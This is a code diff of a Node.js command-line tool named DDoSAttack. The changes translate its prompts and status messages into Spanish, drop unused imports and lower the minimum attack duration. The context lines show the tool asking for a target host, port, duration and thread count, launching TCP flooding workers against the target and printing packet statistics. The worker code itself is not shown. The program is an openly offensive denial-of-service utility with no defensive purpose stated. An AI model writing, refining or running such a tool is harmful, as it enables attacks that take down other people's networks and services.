@@ -2,11 +2,8 @@
 'use strict';
 
 const net = require('net');
-const dgram = require('dgram');
 const crypto = require('crypto');
 const readline = require('readline');
-const http = require('http');
-const https = require('https');
 const os = require('os');
 const dns = require('dns').promises;
 
@@ -37,7 +34,7 @@ class DDoSAttack {
             const input = await this.input(message);
             const num = parseInt(input);
             if (!isNaN(num) && num >= min && num <= max) return num;
-            console.log('\x1b[1;31mInvalid input. Please try again.\x1b[0m');
+            console.log('\x1b[1;31mEntrada inválida. Intente nuevamente.\x1b[0m');
         }
     }
 
@@ -45,12 +42,12 @@ class DDoSAttack {
         try {
             if (!net.isIP(target)) {
                 const records = await dns.resolve4(target);
-                console.log(`\x1b[1;36mDNS resolved: ${records[0]}\x1b[0m`);
+                console.log(`\x1b[1;36mDNS resuelto: ${records[0]}\x1b[0m`);
                 return records[0];
             }
             return target;
-        } catch (err) {
-            console.log('\x1b[1;33mDNS resolution failed, using as IP\x1b[0m');
+        } catch {
+            console.log('\x1b[1;33mFallo en resolución DNS, usando como IP\x1b[0m');
             return target;
         }
     }
@@ -80,23 +77,23 @@ class DDoSAttack {
     }
 
     async start() {
-        console.log('\x1b[1;36m=== Attack Configuration ===\x1b[0m');
+        console.log('\x1b[1;36m=== Configuración de Ataque ===\x1b[0m');
 
-        const target = await this.input('Target (IP/Domain): ');
+        const target = await this.input('Objetivo (IP/Dominio): ');
         this.target = await this.resolveDNS(target);
-        this.port = await this.inputNumber('Port (1-65535): ', 1, 65535);
-        this.duration = await this.inputNumber('Duration (seconds): ', 10, 3600);
-        this.threads = await this.inputNumber('Number of threads: ', 1, os.cpus().length * 2);
+        this.port = await this.inputNumber('Puerto (1-65535): ', 1, 65535);
+        this.duration = await this.inputNumber('Duración (segundos): ', 1, 3600);
+        this.threads = await this.inputNumber('Número de hilos: ', 1, os.cpus().length * 2);
 
-        console.log('\n\x1b[1;36m=== Summary ===\x1b[0m');
-        console.log(`Target: ${this.target}`);
-        console.log(`Port: ${this.port}`);
-        console.log(`Duration: ${this.duration}s`);
-        console.log(`Threads: ${this.threads}`);
+        console.log('\n\x1b[1;36m=== Resumen ===\x1b[0m');
+        console.log(`Objetivo: ${this.target}`);
+        console.log(`Puerto: ${this.port}`);
+        console.log(`Duración: ${this.duration}s`);
+        console.log(`Hilos: ${this.threads}`);
 
-        const confirm = await this.input('\nStart attack? (y/n): ');
-        if (confirm.toLowerCase() !== 'y') {
-            console.log('\x1b[1;33mAttack canceled\x1b[0m');
+        const confirm = await this.input('¿Iniciar ataque? (s/n): ');
+        if (confirm.toLowerCase() !== 's') {
+            console.log('\x1b[1;33mAtaque cancelado\x1b[0m');
             process.exit(0);
         }
 
@@ -104,7 +101,7 @@ class DDoSAttack {
     }
 
     async runAttack() {
-        console.log('\n\x1b[1;31mStarting attack...\x1b[0m');
+        console.log('\n\x1b[1;31mIniciando ataque...\x1b[0m');
 
         for (let i = 0; i < this.threads; i++) {
             this.workers.push(this.createTCPWorker(this.target, this.port)());
@@ -112,18 +109,18 @@ class DDoSAttack {
 
         const statsInterval = setInterval(() => {
             const elapsed = Math.floor((Date.now() - this.stats.start) / 1000);
-            console.log('\n\x1b[1;35m=== Statistics ===\x1b[0m');
-            console.log(`Time: ${elapsed}s`);
-            console.log(`Packets: ${this.stats.packets}`);
-            console.log(`Successful: ${this.stats.successful}`);
-            console.log(`Failed: ${this.stats.failed}`);
-            console.log(`Methods: ${Array.from(this.stats.methods).join(', ')}`);
+            console.log('\n\x1b[1;35m=== Estadísticas ===\x1b[0m');
+            console.log(`Tiempo: ${elapsed}s`);
+            console.log(`Paquetes: ${this.stats.packets}`);
+            console.log(`Exitosos: ${this.stats.successful}`);
+            console.log(`Fallidos: ${this.stats.failed}`);
+            console.log(`Métodos: ${Array.from(this.stats.methods).join(', ')}`);
         }, 5000);
 
         setTimeout(() => {
             clearInterval(statsInterval);
             this.stopAttack();
-            console.log('\n\x1b[1;32mAttack completed\x1b[0m');
+            console.log('\n\x1b[1;32mAtaque completado\x1b[0m');
             process.exit(0);
         }, this.duration * 1000);
     }
@@ -137,7 +134,7 @@ class DDoSAttack {
 }
 
 process.on('SIGINT', () => {
-    console.log('\n\x1b[1;33mAttack stopped manually\x1b[0m');
+    console.log('\n\x1b[1;33mAtaque detenido manualmente\x1b[0m');
     process.exit(0);
 });
 
